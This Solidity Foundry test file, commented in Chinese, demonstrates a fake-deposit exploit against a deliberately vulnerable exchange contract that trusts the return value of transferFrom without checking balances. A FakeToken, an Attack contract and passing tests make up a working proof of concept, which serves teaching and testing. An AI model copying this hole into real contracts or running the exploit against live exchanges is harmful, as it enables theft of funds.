pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// VulnerableExchange and FakeToken contracts as provided

// 此 interface 為簡化版本的 ERC20 interface
interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * VulnerableExchange 合約存在漏洞: Missing Token Verification of Exchange
 *
 * 當 depositToken 函式呼叫傳入的 token 合約的 transferFrom 時，僅檢查回傳值，不確認是否真正扣除使用者的 token。
 */
contract VulnerableExchange {
    // tokens[token 地址][使用者地址] = deposit 金額
    mapping(address => mapping(address => uint256)) public tokens;

    // Deposit 事件
    event Deposit(address indexed token, address indexed user, uint256 amount, uint256 balance);

    // depositToken 函式
    function depositToken(address token, uint256 amount) public payable {
        require(msg.value == 0, "No Ether allowed");
        require(token != address(0), "Invalid token address");

        // 漏洞：僅根據 transferFrom 回傳值進行判斷，不確認 token 真的扣減了
        bool success = IERC20(token).transferFrom(msg.sender, address(this), amount);
        require(success, "transferFrom failed");

        tokens[token][msg.sender] += amount;
        emit Deposit(token, msg.sender, amount, tokens[token][msg.sender]);
    }
}

/**
 * FakeToken 合約為偽造的 ERC20 Token，用於模擬攻擊行為
 * transferFrom 在此僅回傳 true，不真正扣減餘額
 */
contract FakeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        balanceOf[msg.sender] = 1000000 ether;
    }

    // 偽造的 transferFrom: 始終回傳 true 但不扣減餘額
    function transferFrom(address, address, uint256) public pure returns (bool) {
        return true;
    }
}

/**
 * Attack 合約示範如何利用上述漏洞進行假存款攻擊
 */
contract Attack {
    VulnerableExchange public vulnerableExchange;
    FakeToken public fakeToken;
    address public owner;

    constructor(VulnerableExchange _vulnerableExchange) {
        vulnerableExchange = _vulnerableExchange;
        fakeToken = new FakeToken();
        owner = msg.sender;
    }

    // executeAttack 利用 FakeToken 的漏洞進行虛假存款
    function executeAttack(uint256 depositAmount) public {
        // 無需批准，因 FakeToken.transferFrom 不檢查餘額
        vulnerableExchange.depositToken{value: 0}(address(fakeToken), depositAmount);
    }
}


contract VulnerableExchangeTest is Test {
    VulnerableExchange public vulnerableExchange;
    Attack public attack;
    address public attacker = address(0xBEEF);

    function setUp() public {
        // 部署 VulnerableExchange 時使用預設 msg.sender
        vulnerableExchange = new VulnerableExchange();

        // 使用 attacker 身份部署 Attack 合約
        vm.prank(attacker);
        attack = new Attack(vulnerableExchange);
    }

    function testExploitFakeDeposit() public {
        uint256 depositAmount = 100 ether;

        // 作為 attacker 呼叫 executeAttack，利用 FakeToken 的漏洞
        vm.prank(attacker);
        attack.executeAttack(depositAmount);

        // 檢查 VulnerableExchange 內部記錄的 deposit 數值是否被更新
        // 注意：因為 depositToken 的 msg.sender 為 Attack 合約，
        // 所以內部 mapping 鍵是 attack 合約地址
        uint256 recordedDeposit = vulnerableExchange.tokens(address(attack.fakeToken()), address(attack));
        assertEq(recordedDeposit, depositAmount, "Attack deposit amount not recorded correctly");
    }

    function testLegitimateTokenDepositFailsVerification() public {
        // 此測試模擬真實的 token 合約，如果 transferFrom 回傳 false，則 deposit應該失敗
        // 我們建立一個 dummy token 呼叫會回傳 false
        DummyToken dummy = new DummyToken();
        uint256 depositAmount = 50 ether;

        // 呼叫 depositToken 期望 revert, 因為 transferFrom 會失敗
        vm.expectRevert(bytes("transferFrom failed"));
        vulnerableExchange.depositToken(address(dummy), depositAmount);
    }
}

// DummyToken 為一個正常的偽造 token，但此處故意使 transferFrom 回傳 false 來模擬拒絕轉移
contract DummyToken is IERC20 {
    function transferFrom(address, address, uint256) external pure override returns (bool) {
        return false;
    }

    function balanceOf(address) external pure override returns (uint256) {
        return 0;
    }
}
